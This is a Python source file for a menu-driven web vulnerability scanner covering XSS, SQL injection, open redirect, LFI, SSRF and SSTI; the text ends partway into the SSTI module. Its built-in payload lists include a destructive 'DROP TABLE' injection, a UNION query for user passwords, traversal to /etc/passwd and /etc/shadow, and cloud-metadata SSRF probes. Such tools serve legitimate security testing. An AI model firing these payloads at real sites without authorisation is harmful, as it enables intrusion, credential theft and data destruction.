#!/usr/bin/python3

import os
import sys
import requests
import random
import time
import concurrent.futures
import urllib.parse
from urllib.parse import urlparse, urljoin, urlencode, parse_qs
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, UnexpectedAlertPresentException
from webdriver_manager.chrome import ChromeDriverManager
from prompt_toolkit import prompt
from prompt_toolkit.completion import PathCompleter
import urllib3
import re

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Color class for consistent styling
class Color:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'

# Initialize colorama
init(autoreset=True)

# User agents for request randomization
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]

VERSION = "1.1"

def clear_screen():
    """Clear the terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    """Display the MXPLOIT banner"""
    banner = f"""
{Color.RED}{Color.BOLD}
<-. (`-')   (`-')      _  (`-')                      _     (`-')      
   \(OO )_  (OO )_.->  \-.(OO )   <-.        .->    (_)    ( OO).->   
,--./  ,-.) (_| \_)--. _.'    \ ,--. )  (`-')----.  ,-(`-')/    '._   
|   `.'   | \  `.'  / (_...--'' |  (`-')( OO).-.  ' | ( OO)|'--...__) 
|  |'.'|  |  \    .') |  |_.' | |  |OO )( _) | |  | |  |  )`--.  .--' 
|  |   |  |  .'    \  |  .___.'(|  '__ | \|  |)|  |(|  |_/    |  |    
|  |   |  | /  .'.  \ |  |      |     |'  '  '-'  ' |  |'->   |  |    
`--'   `--'`--'   '--'`--'      `-----'    `-----'  `--'      `--'    
                                                                 
{Color.RESET}{Color.YELLOW}Advanced Web Vulnerability Scanner {Color.WHITE}v{VERSION}
{Color.CYAN}Developed by: YourNameHere
{Color.RESET}
    """
    print(banner)

def display_xss_banner():
    """Display the XSS Scanner banner"""
    banner = f"""
{Color.RED}{Color.BOLD}
_ (`-')      (`-').-> (`-').->     (`-').->           (`-')  _ <-. (`-')_ <-. (`-')_  (`-')  _   (`-')  
 (OO )_.->  ( OO)_   ( OO)_       ( OO)_   _         (OO ).-/    \( OO) )   \( OO) ) ( OO).-/<-.(OO )  
 (_| \_)--.(_)--\_) (_)--\_)     (_)--\_)  \-,-----. / ,---.  ,--./ ,--/ ,--./ ,--/ (,------.,------,) 
 \  `.'  / /    _ / /    _ /     /    _ /   |  .--./ | \ /`.\ |   \ |  | |   \ |  |  |  .---'|   /`. ' 
  \    .') \_..`--. \_..`--.     \_..`--.  /_) (`-') '-'|_.' ||  . '|  |)|  . '|  |)(|  '--. |  |_.' | 
  .'    \  .-._)   \.-._)   \    .-._)   \ ||  |OO )(|  .-.  ||  |\    | |  |\    |  |  .--' |  .   .' 
 /  .'.  \ \       /\       /    \       /(_'  '--'\ |  | |  ||  | \   | |  | \   |  |  `---.|  |\  \  
`--'   '--' `-----'  `-----'      `-----'    `-----' `--' `--'`--'  `--' `--'  `--'  `------'`--' '--' 
{Color.RESET}{Color.YELLOW}Cross-Site Scripting Vulnerability Scanner
{Color.RESET}
    """
    print(banner)

def display_sqli_banner():
    """Display the SQL Injection Scanner banner"""
    banner = f"""
{Color.RED}{Color.BOLD}
 (`-').-> <-.(`-')            _          (`-').->           (`-')  _ <-. (`-')_ <-. (`-')_  (`-')  _   (`-')  
 ( OO)_    __( OO)    <-.    (_)         ( OO)_   _         (OO ).-/    \( OO) )   \( OO) ) ( OO).-/<-.(OO )  
(_)--\_)  '-'---\_) ,--. )   ,-(`-')    (_)--\_)  \-,-----. / ,---.  ,--./ ,--/ ,--./ ,--/ (,------.,------,) 
/    _ / |  .-.  |  |  (`-') | ( OO)    /    _ /   |  .--./ | \ /`.\ |   \ |  | |   \ |  |  |  .---'|   /`. ' 
\_..`--. |  | | <-' |  |OO ) |  |  )    \_..`--.  /_) (`-') '-'|_.' ||  . '|  |)|  . '|  |)(|  '--. |  |_.' | 
.-._)   \|  | |  | (|  '__ |(|  |_/     .-._)   \ ||  |OO )(|  .-.  ||  |\    | |  |\    |  |  .--' |  .   .' 
\       /'  '-'  '-.|     |' |  |'->    \       /(_'  '--'\ |  | |  ||  | \   | |  | \   |  |  `---.|  |\  \  
 `-----'  `-----'--'`-----'  `--'        `-----'    `-----' `--' `--'`--'  `--' `--'  `--'  `------'`--' '--' 
                                                                                                                      
{Color.RESET}{Color.YELLOW}SQL Injection Vulnerability Scanner
{Color.RESET}
    """
    print(banner)

def display_or_banner():
    """Display the Open Redirect Scanner banner"""
    banner = f"""
{Color.RED}{Color.BOLD}
              (`-')      (`-').->           (`-')  _ <-. (`-')_ <-. (`-')_  (`-')  _   (`-')  
     .->   <-.(OO )      ( OO)_   _         (OO ).-/    \( OO) )   \( OO) ) ( OO).-/<-.(OO )  
(`-')----. ,------,)    (_)--\_)  \-,-----. / ,---.  ,--./ ,--/ ,--./ ,--/ (,------.,------,) 
( OO).-.  '|   /`. '    /    _ /   |  .--./ | \ /`.\ |   \ |  | |   \ |  |  |  .---'|   /`. ' 
( _) | |  ||  |_.' |    \_..`--.  /_) (`-') '-'|_.' ||  . '|  |)|  . '|  |)(|  '--. |  |_.' | 
 \|  |)|  ||  .   .'    .-._)   \ ||  |OO )(|  .-.  ||  |\    | |  |\    |  |  .--' |  .   .' 
  '  '-'  '|  |\  \     \       /(_'  '--'\ |  | |  ||  | \   | |  | \   |  |  `---.|  |\  \  
   `-----' `--' '--'     `-----'    `-----' `--' `--'`--'  `--' `--'  `--'  `------'`--' '--' 
                                                                                                                
{Color.RESET}{Color.YELLOW}Open Redirect Vulnerability Scanner
{Color.RESET}
    """
    print(banner)

def display_lfi_banner():
    """Display the LFI Scanner banner"""
    banner = f"""
{Color.RED}{Color.BOLD}
                     _          (`-').->           (`-')  _ <-. (`-')_ <-. (`-')_  (`-')  _   (`-')  
   <-.      <-.     (_)         ( OO)_   _         (OO ).-/    \( OO) )   \( OO) ) ( OO).-/<-.(OO )  
 ,--. )  (`-')-----.,-(`-')    (_)--\_)  \-,-----. / ,---.  ,--./ ,--/ ,--./ ,--/ (,------.,------,) 
 |  (`-')(OO|(_\---'| ( OO)    /    _ /   |  .--./ | \ /`.\ |   \ |  | |   \ |  |  |  .---'|   /`. ' 
 |  |OO ) / |  '--. |  |  )    \_..`--.  /_) (`-') '-'|_.' ||  . '|  |)|  . '|  |)(|  '--. |  |_.' | 
(|  '__ | \_)  .--'(|  |_/     .-._)   \ ||  |OO )(|  .-.  ||  |\    | |  |\    |  |  .--' |  .   .' 
 |     |'  `|  |_)  |  |'->    \       /(_'  '--'\ |  | |  ||  | \   | |  | \   |  |  `---.|  |\  \  
 `-----'    `--'    `--'        `-----'    `-----' `--' `--'`--'  `--' `--'  `--'  `------'`--' '--' 
                                                                                            
{Color.RESET}{Color.YELLOW}Local File Inclusion Vulnerability Scanner
{Color.RESET}
    """
    print(banner)

def display_ssrf_banner():
    """Display the SSRF Scanner banner"""
    banner = f"""
{Color.RED}{Color.BOLD}
 (`-').-> (`-').->   (`-')                 (`-').->           (`-')  _ <-. (`-')_ <-. (`-')_  (`-')  _   (`-')  
 ( OO)_   ( OO)_  <-.(OO )    <-.          ( OO)_   _         (OO ).-/    \( OO) )   \( OO) ) ( OO).-/<-.(OO )  
(_)--\_) (_)--\_) ,------,)(`-')-----.    (_)--\_)  \-,-----. / ,---.  ,--./ ,--/ ,--./ ,--/ (,------.,------,) 
/    _ / /    _ / |   /`. '(OO|(_\---'    /    _ /   |  .--./ | \ /`.\ |   \ |  | |   \ |  |  |  .---'|   /`. ' 
\_..`--. \_..`--. |  |_.' | / |  '--.     \_..`--.  /_) (`-') '-'|_.' ||  . '|  |)|  . '|  |)(|  '--. |  |_.' | 
.-._)   \.-._)   \|  .   .' \_)  .--'     .-._)   \ ||  |OO )(|  .-.  ||  |\    | |  |\    |  |  .--' |  .   .' 
\       /\       /|  |\  \   `|  |_)      \       /(_'  '--'\ |  | |  ||  | \   | |  | \   |  |  `---.|  |\  \  
 `-----'  `-----' `--' '--'   `--'         `-----'    `-----' `--' `--'`--'  `--' `--'  `--'  `------'`--' '--' 
                                                                                                
{Color.RESET}{Color.YELLOW}Server-Side Request Forgery Vulnerability Scanner
{Color.RESET}
    """
    print(banner)

def display_ssti_banner():
    """Display the SSTI Scanner banner"""
    banner = f"""
{Color.RED}{Color.BOLD}
 (`-').-> (`-').->(`-')      _          (`-').->           (`-')  _ <-. (`-')_ <-. (`-')_  (`-')  _   (`-')  
 ( OO)_   ( OO)_  ( OO).->  (_)         ( OO)_   _         (OO ).-/    \( OO) )   \( OO) ) ( OO).-/<-.(OO )  
(_)--\_) (_)--\_) /    '._  ,-(`-')    (_)--\_)  \-,-----. / ,---.  ,--./ ,--/ ,--./ ,--/ (,------.,------,) 
/    _ / /    _ / |'--...__)| ( OO)    /    _ /   |  .--./ | \ /`.\ |   \ |  | |   \ |  |  |  .---'|   /`. ' 
\_..`--. \_..`--. `--.  .--'|  |  )    \_..`--.  /_) (`-') '-'|_.' ||  . '|  |)|  . '|  |)(|  '--. |  |_.' | 
.-._)   \.-._)   \   |  |  (|  |_/     .-._)   \ ||  |OO )(|  .-.  ||  |\    | |  |\    |  |  .--' |  .   .' 
\       /\       /   |  |   |  |'->    \       /(_'  '--'\ |  | |  ||  | \   | |  | \   |  |  `---.|  |\  \  
 `-----'  `-----'    `--'   `--'        `-----'    `-----' `--' `--'`--'  `--' `--'  `--'  `------'`--' '--' 
                                                                                                      
{Color.RESET}{Color.YELLOW}Server-Side Template Injection Vulnerability Scanner
{Color.RESET}
    """
    print(banner)

def display_menu():
    """Display the main menu"""
    print(f"\n{Color.BOLD}{Color.WHITE}Main Menu:{Color.RESET}")
    print(f"{Color.WHITE}[1] XSS Scanner")
    print(f"{Color.WHITE}[2] SQL Injection Scanner")
    print(f"{Color.WHITE}[3] Open Redirect Scanner")
    print(f"{Color.WHITE}[4] LFI Scanner")
    print(f"{Color.WHITE}[5] SSRF Scanner")
    print(f"{Color.WHITE}[6] SSTI Scanner")
    print(f"{Color.WHITE}[7] Exit{Color.RESET}")

def press_enter_to_continue():
    """Prompt to press Enter and return to main menu"""
    input(f"\n{Color.CYAN}[?] Press Enter to return to main menu...{Color.RESET}")
    clear_screen()
    display_banner()

def get_random_user_agent():
    """Return a random user agent from the list"""
    return random.choice(USER_AGENTS)

def get_retry_session(retries=3, backoff_factor=0.3, status_forcelist=(500, 502, 504)):
    """Create a requests session with retry logic"""
    session = requests.Session()
    retry = urllib3.util.Retry(
        total=retries,
        read=retries,
        connect=retries,
        backoff_factor=backoff_factor,
        status_forcelist=status_forcelist,
    )
    adapter = requests.adapters.HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

def get_file_path(prompt_text):
    """Prompt for file path with autocompletion"""
    completer = PathCompleter()
    return prompt(prompt_text, completer=completer).strip()

def prompt_for_urls():
    """Prompt user for URLs to scan"""
    while True:
        try:
            url_input = input(f"{Color.CYAN}[?] Enter path to URL file (or press Enter for single URL): {Color.RESET}").strip()
            if url_input:
                if not os.path.isfile(url_input):
                    print(f"{Color.RED}[!] File not found: {url_input}{Color.RESET}")
                    continue
                with open(url_input) as file:
                    urls = [line.strip() for line in file if line.strip()]
                return urls
            else:
                single_url = input(f"{Color.CYAN}[?] Enter single URL to scan: {Color.RESET}").strip()
                if single_url:
                    return [single_url]
                print(f"{Color.RED}[!] You must provide either a file or single URL{Color.RESET}")
        except Exception as e:
            print(f"{Color.RED}[!] Error: {str(e)}{Color.RESET}")

def prompt_for_payloads(default_file=None, scan_type=None):
    """Prompt user for payloads file with option to use default"""
    while True:
        try:
            payload_input = input(f"{Color.CYAN}[?] Enter path to payloads file (or press Enter for default {scan_type} payloads): {Color.RESET}").strip()
            if not payload_input and default_file:
                # Use default payloads if available
                if scan_type == "XSS":
                    return [
                        "<script>alert('XSS')</script>",
                        "<img src=x onerror=alert('XSS')>",
                        "\"><script>alert('XSS')</script>",
                        "javascript:alert('XSS')",
                        "<svg/onload=alert('XSS')>"
                    ]
                elif scan_type == "SQLi":
                    return [
                        "' OR '1'='1",
                        "' OR 1=1--",
                        "\" OR \"\"=\"",
                        "' OR ''='",
                        "' OR 1=1#",
                        "\" OR 1=1--",
                        "' OR 'a'='a",
                        "\" OR \"a\"=\"a",
                        "' OR 1=1; DROP TABLE users--",
                        "' UNION SELECT null, username, password FROM users--"
                    ]
                elif scan_type == "OpenRedirect":
                    return [
                        "//google.com",
                        "//google.com/",
                        "/\\google.com",
                        "/\\/google.com",
                        "/https://google.com",
                        "/http://google.com",
                        "%2f%2fgoogle.com",
                        "%2f%2fgoogle.com%2f",
                        "%5cgoogle.com",
                        "%5c%5cgoogle.com",
                        "/%09/google.com",
                        "/%0d/google.com",
                        "/%0a/google.com",
                        "/%0d%0a/google.com",
                        "/%23/google.com",
                        "/%3f/google.com",
                        "/%26/google.com",
                        "/%3d/google.com"
                    ]
                elif scan_type == "LFI":
                    return [
                        "../../../../../../../../etc/passwd",
                        "../../../../../../../../etc/shadow",
                        "../../../../../../../../windows/win.ini",
                        "../../../../../../../../windows/system.ini",
                        "....//....//....//....//....//....//....//etc/passwd",
                        "..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
                        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
                        "file:///etc/passwd",
                        "file:///c:/windows/win.ini",
                        "php://filter/convert.base64-encode/resource=index.php"
                    ]
                elif scan_type == "SSRF":
                    return [
                        "http://localhost",
                        "http://127.0.0.1",
                        "http://169.254.169.254/latest/meta-data/",
                        "http://[::1]",
                        "http://2130706433",  # 127.0.0.1 as integer
                        "http://0x7f000001",  # 127.0.0.1 as hex
                        "http://0177.0.0.1",  # 127.0.0.1 as octal
                        "http://localtest.me",
                        "http://burpcollaborator.net",
                        "dict://localhost:6379/info"
                    ]
                elif scan_type == "SSTI":
                    return [
                        "{{7*7}}",
                        "${7*7}",
                        "#{7*7}",
                        "<%= 7*7 %>",
                        "${{7*7}}",
                        "@(7*7)",
                        "{{config}}",
                        "${config}",
                        "#{config}",
                        "<%= config %>",
                        "${{config}}",
                        "@(config)",
                        "{{''.__class__.__mro__[1].__subclasses__()}}",
                        "${''.class.mro[1].subclasses()}",
                        "#{''.class.mro[1].subclasses()}",
                        "<%= ''.class.mro[1].subclasses() %>",
                        "${{''.class.mro[1].subclasses()}}",
                        "@(''.class.mro[1].subclasses())"
                    ]
                else:
                    return []
            
            if not os.path.isfile(payload_input):
                print(f"{Color.RED}[!] File not found: {payload_input}{Color.RESET}")
                continue
            
            with open(payload_input, 'r', encoding='utf-8') as f:
                payloads = [line.strip() for line in f if line.strip()]
            return payloads
        except Exception as e:
            print(f"{Color.RED}[!] Error: {str(e)}{Color.RESET}")

def print_scan_summary(total_found, total_scanned, start_time):
    """Print scan summary"""
    print(f"\n{Color.YELLOW}{Color.BOLD}Scan Summary:{Color.RESET}")
    print(f"{Color.CYAN}• Vulnerabilities Found: {Color.GREEN if total_found > 0 else Color.RED}{total_found}{Color.RESET}")
    print(f"{Color.CYAN}• URLs Scanned: {Color.WHITE}{total_scanned}{Color.RESET}")
    print(f"{Color.CYAN}• Time Taken: {Color.WHITE}{time.time() - start_time:.2f} seconds{Color.RESET}")

def save_results(vulnerable_urls, scan_type):
    """Save vulnerable URLs to a file"""
    if not vulnerable_urls:
        return
    
    timestamp = time.strftime("%Y%m%d-%H%M%S")
    filename = f"mxploit_{scan_type.lower()}_results_{timestamp}.txt"
    
    try:
        with open(filename, 'w') as f:
            f.write("\n".join(vulnerable_urls))
        print(f"\n{Color.GREEN}[+] Results saved to: {filename}{Color.RESET}")
    except Exception as e:
        print(f"\n{Color.RED}[!] Error saving results: {str(e)}{Color.RESET}")

# XSS Scanner Functions
def run_xss_scanner():
    """Main XSS scanning function"""
    clear_screen()
    display_xss_banner()
    
    # Initialize Chrome driver pool
    driver_pool = []
    for _ in range(3):  # Create 3 drivers
        driver_pool.append(create_chrome_driver())
    
    try:
        urls = prompt_for_urls()
        payloads = prompt_for_payloads("xss_payloads.txt", "XSS")
        
        vulnerable_urls = []
        total_scanned = 0
        start_time = time.time()
        
        for url in urls:
            print(f"\n{Color.YELLOW}[*] Scanning URL: {url}{Color.RESET}")
            for payload in payloads:
                result = scan_xss(url, payload, driver_pool)
                total_scanned += 1
                if result:
                    vulnerable_urls.append(result)
        
        print_scan_summary(len(vulnerable_urls), total_scanned, start_time)
        save_results(vulnerable_urls, "XSS")
        
    except KeyboardInterrupt:
        print(f"\n{Color.RED}[!] Scan interrupted by user{Color.RESET}")
    finally:
        # Clean up drivers
        for driver in driver_pool:
            try:
                driver.quit()
            except:
                pass
    
    press_enter_to_continue()

def create_chrome_driver():
    """Create a headless Chrome driver"""
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--disable-extensions")
    chrome_options.page_load_strategy = 'eager'
    
    service = Service(ChromeDriverManager().install())
    return webdriver.Chrome(service=service, options=chrome_options)

def scan_xss(url, payload, driver_pool):
    """Scan a single URL with a payload for XSS"""
    driver = driver_pool.pop() if driver_pool else create_chrome_driver()
    
    try:
        # Generate URL with payload in each parameter
        parsed = urllib.parse.urlparse(url)
        if not parsed.query:
            # If no query parameters, test in path
            test_url = urllib.parse.urlunparse(parsed._replace(path=parsed.path + payload))
        else:
            # Test in each query parameter
            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            for param in params:
                modified_params = params.copy()
                modified_params[param] = [payload]
                test_url = urllib.parse.urlunparse(
                    parsed._replace(
                        query=urllib.parse.urlencode(modified_params, doseq=True)
                    )
                )
                
                print(f"{Color.WHITE}[→] Testing: {param}={payload}{Color.RESET}")
                
                try:
                    driver.get(test_url)
                    
                    # Check for alert
                    try:
                        WebDriverWait(driver, 2).until(EC.alert_is_present())
                        alert = driver.switch_to.alert
                        alert_text = alert.text
                        alert.accept()
                        print(f"{Color.GREEN}[✓] XSS Found: {test_url} (Alert: {alert_text}){Color.RESET}")
                        return test_url
                    except TimeoutException:
                        print(f"{Color.RED}[✗] No XSS: {param}{Color.RESET}")
                        
                except Exception as e:
                    print(f"{Color.RED}[!] Error testing {test_url}: {str(e)}{Color.RESET}")
    
    finally:
        driver_pool.append(driver)
    
    return None

# SQL Injection Scanner Functions
def run_sqli_scanner():
    """Main SQLi scanning function"""
    clear_screen()
    display_sqli_banner()
    
    urls = prompt_for_urls()
    payloads = prompt_for_payloads("sqli_payloads.txt", "SQLi")
    
    vulnerable_urls = []
    total_scanned = 0
    start_time = time.time()
    
    try:
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = []
            for url in urls:
                print(f"\n{Color.YELLOW}[*] Scanning URL: {url}{Color.RESET}")
                for payload in payloads:
                    futures.append(executor.submit(scan_sqli, url, payload))
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                total_scanned += 1
                if result:
                    vulnerable_urls.append(result)
    
    except KeyboardInterrupt:
        print(f"\n{Color.RED}[!] Scan interrupted by user{Color.RESET}")
    
    print_scan_summary(len(vulnerable_urls), total_scanned, start_time)
    save_results(vulnerable_urls, "SQLi")
    press_enter_to_continue()

def scan_sqli(url, payload):
    """Scan a single URL with a payload for SQLi"""
    session = get_retry_session()
    headers = {'User-Agent': get_random_user_agent()}
    
    # Test in query parameters
    parsed = urllib.parse.urlparse(url)
    if not parsed.query:
        # If no query parameters, test in path
        test_url = urllib.parse.urlunparse(parsed._replace(path=parsed.path + urllib.parse.quote(payload)))
    else:
        # Test in each query parameter
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        for param in params:
            modified_params = params.copy()
            modified_params[param] = [payload]
            test_url = urllib.parse.urlunparse(
                parsed._replace(
                    query=urllib.parse.urlencode(modified_params, doseq=True)
                )
            )
            
            print(f"{Color.WHITE}[→] Testing: {param}={payload}{Color.RESET}")
            
            try:
                start_time = time.time()
                response = session.get(test_url, headers=headers, timeout=10, verify=False)
                response_time = time.time() - start_time
                
                # Time-based detection
                if response_time > 5:  # If response takes more than 5 seconds
                    print(f"{Color.GREEN}[✓] Potential SQLi (Time-based): {test_url} (Response time: {response_time:.2f}s){Color.RESET}")
                    return test_url
                
                # Error-based detection
                error_patterns = [
                    r"SQL syntax.*MySQL|Warning.*mysql_.*|unclosed quotation mark after the character string|quoted string not properly terminated",
                    r"Microsoft OLE DB Provider for ODBC Drivers|Microsoft OLE DB Provider for SQL Server|Incorrect syntax near",
                    r"ODBC Driver.* for SQL Server|SQL Server.*Driver|Syntax error in string in query expression",
                    r"PostgreSQL.*ERROR|Warning.*pg_.*|valid PostgreSQL result",
                    r"ORA-[0-9][0-9][0-9][0-9]|Oracle error|Oracle.*Driver|Warning.*oci_.*",
                    r"CLI Driver.*DB2|DB2 SQL error",
                    r"SQLite/JDBCDriver|SQLite.Exception|System.Data.SQLite.SQLiteException",
                    r"Warning.*sqlite_.*|Warning.*SQLite3::|unrecognized token:"
                ]
                
                for pattern in error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        print(f"{Color.GREEN}[✓] Potential SQLi (Error-based): {test_url}{Color.RESET}")
                        return test_url
                
                print(f"{Color.RED}[✗] No SQLi: {param}{Color.RESET}")
                
            except Exception as e:
                print(f"{Color.RED}[!] Error testing {test_url}: {str(e)}{Color.RESET}")
    
    return None

# Open Redirect Scanner Functions
def run_or_scanner():
    """Main Open Redirect scanning function"""
    clear_screen()
    display_or_banner()
    
    urls = prompt_for_urls()
    payloads = prompt_for_payloads("or_payloads.txt", "OpenRedirect")
    
    vulnerable_urls = []
    total_scanned = 0
    start_time = time.time()
    
    try:
        driver = create_chrome_driver()
        
        for url in urls:
            print(f"\n{Color.YELLOW}[*] Scanning URL: {url}{Color.RESET}")
            for payload in payloads:
                result = scan_open_redirect(url, payload, driver)
                total_scanned += 1
                if result:
                    vulnerable_urls.append(result)
    
    except KeyboardInterrupt:
        print(f"\n{Color.RED}[!] Scan interrupted by user{Color.RESET}")
    finally:
        try:
            driver.quit()
        except:
            pass
    
    print_scan_summary(len(vulnerable_urls), total_scanned, start_time)
    save_results(vulnerable_urls, "OpenRedirect")
    press_enter_to_continue()

def scan_open_redirect(url, payload, driver):
    """Scan a single URL for open redirect vulnerabilities"""
    parsed = urllib.parse.urlparse(url)
    
    # Test in query parameters
    if parsed.query:
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        for param in params:
            modified_params = params.copy()
            modified_params[param] = [payload]
            test_url = urllib.parse.urlunparse(
                parsed._replace(
                    query=urllib.parse.urlencode(modified_params, doseq=True)
                )
            )
            
            print(f"{Color.WHITE}[→] Testing: {param}={payload}{Color.RESET}")
            
            try:
                driver.get(test_url)
                current_url = driver.current_url.lower()
                
                # Check if we were redirected to our test domain
                if any(domain in current_url for domain in ["google.com", "example.com", "test.com"]):
                    print(f"{Color.GREEN}[✓] Open Redirect Found: {test_url} → {current_url}{Color.RESET}")
                    return test_url
                
                print(f"{Color.RED}[✗] No Open Redirect: {param}{Color.RESET}")
                
            except Exception as e:
                print(f"{Color.RED}[!] Error testing {test_url}: {str(e)}{Color.RESET}")
    
    # Also test in path
    test_url = urllib.parse.urlunparse(parsed._replace(path=payload))
    print(f"{Color.WHITE}[→] Testing path: {payload}{Color.RESET}")
    
    try:
        driver.get(test_url)
        current_url = driver.current_url.lower()
        
        if any(domain in current_url for domain in ["google.com", "example.com", "test.com"]):
            print(f"{Color.GREEN}[✓] Open Redirect Found: {test_url} → {current_url}{Color.RESET}")
            return test_url
        
        print(f"{Color.RED}[✗] No Open Redirect in path{Color.RESET}")
        
    except Exception as e:
        print(f"{Color.RED}[!] Error testing {test_url}: {str(e)}{Color.RESET}")
    
    return None

# LFI Scanner Functions
def run_lfi_scanner():
    """Main LFI scanning function"""
    clear_screen()
    display_lfi_banner()
    
    urls = prompt_for_urls()
    payloads = prompt_for_payloads("lfi_payloads.txt", "LFI")
    
    vulnerable_urls = []
    total_scanned = 0
    start_time = time.time()
    
    try:
        session = get_retry_session()
        
        for url in urls:
            print(f"\n{Color.YELLOW}[*] Scanning URL: {url}{Color.RESET}")
            for payload in payloads:
                result = scan_lfi(url, payload, session)
                total_scanned += 1
                if result:
                    vulnerable_urls.append(result)
    
    except KeyboardInterrupt:
        print(f"\n{Color.RED}[!] Scan interrupted by user{Color.RESET}")
    
    print_scan_summary(len(vulnerable_urls), total_scanned, start_time)
    save_results(vulnerable_urls, "LFI")
    press_enter_to_continue()

def scan_lfi(url, payload, session):
    """Scan a single URL for LFI vulnerabilities"""
    headers = {'User-Agent': get_random_user_agent()}
    parsed = urllib.parse.urlparse(url)
    
    # Test in query parameters
    if parsed.query:
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        for param in params:
            modified_params = params.copy()
            modified_params[param] = [payload]
            test_url = urllib.parse.urlunparse(
                parsed._replace(
                    query=urllib.parse.urlencode(modified_params, doseq=True)
                )
            )
            
            print(f"{Color.WHITE}[→] Testing: {param}={payload}{Color.RESET}")
            
            try:
                response = session.get(test_url, headers=headers, timeout=10, verify=False)
                
                # Check for common LFI indicators in response
                if "root:" in response.text or "[extensions]" in response.text or "mysql" in response.text.lower():
                    print(f"{Color.GREEN}[✓] Potential LFI Found: {test_url}{Color.RESET}")
                    return test_url
                
                print(f"{Color.RED}[✗] No LFI: {param}{Color.RESET}")
                
            except Exception as e:
                print(f"{Color.RED}[!] Error testing {test_url}: {str(e)}{Color.RESET}")
    
    # Also test in path
    test_url = urllib.parse.urlunparse(parsed._replace(path=payload))
    print(f"{Color.WHITE}[→] Testing path: {payload}{Color.RESET}")
    
    try:
        response = session.get(test_url, headers=headers, timeout=10, verify=False)
        
        if "root:" in response.text or "[extensions]" in response.text or "mysql" in response.text.lower():
            print(f"{Color.GREEN}[✓] Potential LFI Found: {test_url}{Color.RESET}")
            return test_url
        
        print(f"{Color.RED}[✗] No LFI in path{Color.RESET}")
        
    except Exception as e:
        print(f"{Color.RED}[!] Error testing {test_url}: {str(e)}{Color.RESET}")
    
    return None

# SSRF Scanner Functions
def run_ssrf_scanner():
    """Main SSRF scanning function"""
    clear_screen()
    display_ssrf_banner()
    
    urls = prompt_for_urls()
    payloads = prompt_for_payloads("ssrf_payloads.txt", "SSRF")
    
    vulnerable_urls = []
    total_scanned = 0
    start_time = time.time()
    
    try:
        session = get_retry_session()
        
        for url in urls:
            print(f"\n{Color.YELLOW}[*] Scanning URL: {url}{Color.RESET}")
            for payload in payloads:
                result = scan_ssrf(url, payload, session)
                total_scanned += 1
                if result:
                    vulnerable_urls.append(result)
    
    except KeyboardInterrupt:
        print(f"\n{Color.RED}[!] Scan interrupted by user{Color.RESET}")
    
    print_scan_summary(len(vulnerable_urls), total_scanned, start_time)
    save_results(vulnerable_urls, "SSRF")
    press_enter_to_continue()

def scan_ssrf(url, payload, session):
    """Scan a single URL for SSRF vulnerabilities"""
    headers = {'User-Agent': get_random_user_agent()}
    parsed = urllib.parse.urlparse(url)
    
    # Test in query parameters
    if parsed.query:
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        for param in params:
            modified_params = params.copy()
            modified_params[param] = [payload]
            test_url = urllib.parse.urlunparse(
                parsed._replace(
                    query=urllib.parse.urlencode(modified_params, doseq=True)
                )
            )
            
            print(f"{Color.WHITE}[→] Testing: {param}={payload}{Color.RESET}")
            
            try:
                response = session.get(test_url, headers=headers, timeout=10, verify=False)
                
                # Check if the response contains data from our test payload
                if "169.254.169.254" in response.text or "metadata" in response.text.lower():
                    print(f"{Color.GREEN}[✓] Potential SSRF Found: {test_url}{Color.RESET}")
                    return test_url
                
                print(f"{Color.RED}[✗] No SSRF: {param}{Color.RESET}")
                
            except Exception as e:
                print(f"{Color.RED}[!] Error testing {test_url}: {str(e)}{Color.RESET}")
    
    # Also test in path
    test_url = urllib.parse.urlunparse(parsed._replace(path=payload))
    print(f"{Color.WHITE}[→] Testing path: {payload}{Color.RESET}")
    
    try:
        response = session.get(test_url, headers=headers, timeout=10, verify=False)
        
        if "169.254.169.254" in response.text or "metadata" in response.text.lower():
            print(f"{Color.GREEN}[✓] Potential SSRF Found: {test_url}{Color.RESET}")
            return test_url
        
        print(f"{Color.RED}[✗] No SSRF in path{Color.RESET}")
        
    except Exception as e:
        print(f"{Color.RED}[!] Error testing {test_url}: {str(e)}{Color.RESET}")
    
    return None

# SSTI Scanner Functions
def run_ssti_scanner():
    """Main SSTI scanning function"""
